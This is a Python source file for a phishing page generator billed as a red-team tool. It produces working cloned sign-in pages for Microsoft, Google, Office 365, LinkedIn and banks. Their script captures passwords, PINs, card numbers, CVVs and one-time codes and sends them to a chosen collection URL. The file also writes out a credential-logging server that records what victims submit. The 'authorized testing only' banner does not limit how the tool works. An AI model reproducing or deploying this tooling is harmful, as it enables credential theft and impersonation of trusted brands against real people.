#!/usr/bin/env python3
"""
Red Team Tools - Phishing Page Generator
For educational and authorized security testing only
"""

import os
import sys
import base64
import json
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils import *


class PhishingPageGenerator:
    """Phishing page template generator"""
    
    # Base HTML template
    BASE_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ 
            font-family: 'Roboto', sans-serif;
            background: {bg_color};
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }}
        .container {{
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }}
        .logo {{ text-align: center; margin-bottom: 30px; }}
        .logo img {{ max-width: 200px; height: auto; }}
        h1 {{ font-size: 24px; margin-bottom: 20px; text-align: center; color: #333; }}
        .form-group {{ margin-bottom: 20px; }}
        label {{ display: block; margin-bottom: 5px; color: #555; font-size: 14px; }}
        input[type="text"], input[type="email"], input[type="password"] {{
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
        }}
        input:focus {{ border-color: {accent_color}; outline: none; }}
        button {{
            width: 100%;
            padding: 14px;
            background: {accent_color};
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }}
        button:hover {{ opacity: 0.9; }}
        .links {{ text-align: center; margin-top: 20px; font-size: 14px; }}
        .links a {{ color: {accent_color}; text-decoration: none; }}
        .error {{ color: #d93025; font-size: 14px; margin-top: 10px; display: none; }}
        {custom_css}
    </style>
</head>
<body>
    <div class="container">
        {logo_html}
        <h1>{heading}</h1>
        <form id="phishForm" action="{action_url}" method="POST">
            {form_fields}
            <button type="submit">{button_text}</button>
            <div class="error" id="errorMsg">Invalid credentials. Please try again.</div>
        </form>
        <div class="links">
            {footer_links}
        </div>
    </div>
    <script>
        {capture_script}
    </script>
</body>
</html>'''
    
    # Preset themes
    THEMES = {
        "microsoft": {
            "title": "Sign in to your Microsoft account",
            "heading": "Sign in",
            "bg_color": "#f2f2f2",
            "accent_color": "#0067b8",
            "logo_url": "https://logincdn.msftauth.net/shared/1.0/content/images/microsoft_logo.svg",
            "button_text": "Sign in",
            "fields": ["email", "password"],
            "footer": '<a href="#">Can\'t access your account?</a>'
        },
        "google": {
            "title": "Sign in - Google Accounts",
            "heading": "Sign in",
            "bg_color": "#fff",
            "accent_color": "#1a73e8",
            "logo_url": "https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png",
            "button_text": "Next",
            "fields": ["email", "password"],
            "footer": '<a href="#">Forgot email?</a> | <a href="#">Create account</a>'
        },
        "office365": {
            "title": "Sign in to Office 365",
            "heading": "Sign in",
            "bg_color": "#f2f2f2",
            "accent_color": "#0078d4",
            "logo_url": "",
            "button_text": "Sign in",
            "fields": ["email", "password"],
            "footer": '<a href="#">Forgot my password</a>'
        },
        "linkedin": {
            "title": "LinkedIn Login",
            "heading": "Sign in",
            "bg_color": "#f3f2ef",
            "accent_color": "#0a66c2",
            "logo_url": "",
            "button_text": "Sign in",
            "fields": ["email", "password"],
            "footer": '<a href="#">Forgot password?</a> | <a href="#">Join now</a>'
        },
        "generic_login": {
            "title": "Login",
            "heading": "Login to your account",
            "bg_color": "#f5f5f5",
            "accent_color": "#333",
            "logo_url": "",
            "button_text": "Login",
            "fields": ["username", "password"],
            "footer": '<a href="#">Forgot password?</a>'
        },
        "banking": {
            "title": "Secure Login",
            "heading": "Secure Account Login",
            "bg_color": "#003366",
            "accent_color": "#006633",
            "logo_url": "",
            "button_text": "Login",
            "fields": ["username", "password", "pin"],
            "footer": '<a href="#">Forgot credentials?</a> | <a href="#">Enroll now</a>'
        }
    }
    
    def __init__(self):
        pass
    
    def _generate_form_fields(self, fields: list) -> str:
        """Generate form field HTML"""
        field_html = []
        
        field_types = {
            "email": ("Email", "email", "Enter your email"),
            "username": ("Username", "text", "Enter your username"),
            "password": ("Password", "password", "Enter your password"),
            "pin": ("PIN", "password", "Enter your PIN"),
            "phone": ("Phone", "text", "Enter your phone number"),
            "ssn": ("SSN (last 4)", "text", "Enter last 4 of SSN"),
            "dob": ("Date of Birth", "text", "MM/DD/YYYY"),
            "card": ("Card Number", "text", "Enter card number"),
            "cvv": ("CVV", "password", "CVV"),
            "otp": ("One-Time Code", "text", "Enter code")
        }
        
        for field in fields:
            label, ftype, placeholder = field_types.get(field, (field.title(), "text", f"Enter {field}"))
            field_html.append(f'''
            <div class="form-group">
                <label for="{field}">{label}</label>
                <input type="{ftype}" id="{field}" name="{field}" placeholder="{placeholder}" required>
            </div>''')
        
        return '\n'.join(field_html)
    
    def _generate_capture_script(self, log_url: str = None, redirect_url: str = None) -> str:
        """Generate credential capture script"""
        script = '''
        document.getElementById('phishForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var formData = new FormData(this);
            var data = {};
            formData.forEach(function(value, key) {
                data[key] = value;
            });
            
            // Add metadata
            data['timestamp'] = new Date().toISOString();
            data['userAgent'] = navigator.userAgent;
            data['referrer'] = document.referrer;
        '''
        
        if log_url:
            script += f'''
            // Send to collection server
            fetch('{log_url}', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify(data)
            }}).then(function() {{
        '''
        else:
            script += '''
            // Log to console (demo mode)
            console.log('Captured:', data);
            '''
        
        if redirect_url:
            script += f'''
                window.location.href = '{redirect_url}';
            '''
        else:
            script += '''
                document.getElementById('errorMsg').style.display = 'block';
            '''
        
        if log_url:
            script += '''
            }).catch(function() {
                document.getElementById('errorMsg').style.display = 'block';
            });
        '''
        
        script += '''
        });
        '''
        
        return script
    
    def generate_page(self, theme: str = "generic_login", 
                     custom_title: str = None,
                     custom_heading: str = None,
                     custom_logo: str = None,
                     log_url: str = None,
                     redirect_url: str = None,
                     extra_fields: list = None) -> str:
        """Generate phishing page"""
        
        if theme not in self.THEMES:
            theme = "generic_login"
        
        config = self.THEMES[theme].copy()
        
        # Apply customizations
        if custom_title:
            config["title"] = custom_title
        if custom_heading:
            config["heading"] = custom_heading
        
        # Logo HTML
        if custom_logo:
            logo_html = f'<div class="logo"><img src="{custom_logo}" alt="Logo"></div>'
        elif config.get("logo_url"):
            logo_html = f'<div class="logo"><img src="{config["logo_url"]}" alt="Logo"></div>'
        else:
            logo_html = ""
        
        # Fields
        fields = config["fields"]
        if extra_fields:
            fields = fields + extra_fields
        
        # Generate HTML
        html = self.BASE_TEMPLATE.format(
            title=config["title"],
            heading=config["heading"],
            bg_color=config["bg_color"],
            accent_color=config["accent_color"],
            logo_html=logo_html,
            form_fields=self._generate_form_fields(fields),
            button_text=config["button_text"],
            footer_links=config["footer"],
            action_url="#",
            capture_script=self._generate_capture_script(log_url, redirect_url),
            custom_css=""
        )
        
        return html
    
    def generate_credential_logger(self) -> str:
        """Generate a simple credential logging server script"""
        return '''#!/usr/bin/env python3
"""Simple Credential Logger Server"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from datetime import datetime

LOG_FILE = "credentials.log"

class LogHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode())
            
            # Log to file
            with open(LOG_FILE, 'a') as f:
                f.write(f"[{datetime.now()}] {json.dumps(data)}\\n")
            
            print(f"[+] Captured: {data}")
            
            self.send_response(200)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'OK')
        except:
            self.send_response(400)
            self.end_headers()
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def log_message(self, format, *args):
        pass  # Suppress default logging

if __name__ == "__main__":
    PORT = 8888
    server = HTTPServer(('0.0.0.0', PORT), LogHandler)
    print(f"[*] Credential logger running on port {PORT}")
    print(f"[*] Logging to {LOG_FILE}")
    server.serve_forever()
'''
    
    def save_page(self, html: str, filename: str):
        """Save phishing page to file"""
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)
        success(f"Phishing page saved to {filename}")
    
    def list_themes(self):
        """List available themes"""
        print(f"\n{C}Available Themes:{RESET}")
        for name, theme in self.THEMES.items():
            print(f"\n  {Y}[{name}]{RESET}")
            print(f"    Title: {theme['title']}")
            print(f"    Fields: {', '.join(theme['fields'])}")


def interactive_mode():
    """Interactive mode for phishing page generation"""
    print_banner("PHISH PAGE GEN", color="red")
    warning("For authorized security testing only!")
    warning("Use only in authorized phishing simulations!")
    
    generator = PhishingPageGenerator()
    
    options = [
        "Generate Phishing Page",
        "List Available Themes",
        "Generate Credential Logger",
        "Custom Page from Scratch"
    ]
    
    choice = menu_selector(options, "Select Option")
    
    if choice == 0:
        return
    
    elif choice == 1:
        generator.list_themes()
        print()
        
        theme = prompt("Select theme") or "generic_login"
        
        custom_title = prompt("Custom title (or enter to skip)")
        custom_heading = prompt("Custom heading (or enter to skip)")
        custom_logo = prompt("Custom logo URL (or enter to skip)")
        
        log_url = prompt("Credential log URL (or enter to skip)")
        redirect_url = prompt("Redirect URL after submit (or enter to skip)")
        
        extra = prompt("Extra fields (comma-separated, e.g., otp,pin)")
        extra_fields = [f.strip() for f in extra.split(',')] if extra else None
        
        html = generator.generate_page(
            theme=theme,
            custom_title=custom_title or None,
            custom_heading=custom_heading or None,
            custom_logo=custom_logo or None,
            log_url=log_url or None,
            redirect_url=redirect_url or None,
            extra_fields=extra_fields
        )
        
        filename = prompt("Output filename") or "phishing_page.html"
        generator.save_page(html, filename)
        
        info(f"Open {filename} in a browser to preview")
    
    elif choice == 2:
        generator.list_themes()
    
    elif choice == 3:
        logger_script = generator.generate_credential_logger()
        
        filename = prompt("Output filename") or "cred_logger.py"
        with open(filename, 'w') as f:
            f.write(logger_script)
        
        success(f"Credential logger saved to {filename}")
        info(f"Run with: python {filename}")
    
    elif choice == 4:
        print(f"\n{Y}Custom Page Configuration:{RESET}")
        title = prompt("Page title")
        heading = prompt("Heading text")
        fields = prompt("Fields (comma-separated: email,password,otp)")
        fields_list = [f.strip() for f in fields.split(',')]
        
        html = generator.generate_page(
            theme="generic_login",
            custom_title=title,
            custom_heading=heading,
            extra_fields=fields_list
        )
        
        filename = prompt("Output filename") or "custom_phish.html"
        generator.save_page(html, filename)


if __name__ == "__main__":
    interactive_mode()
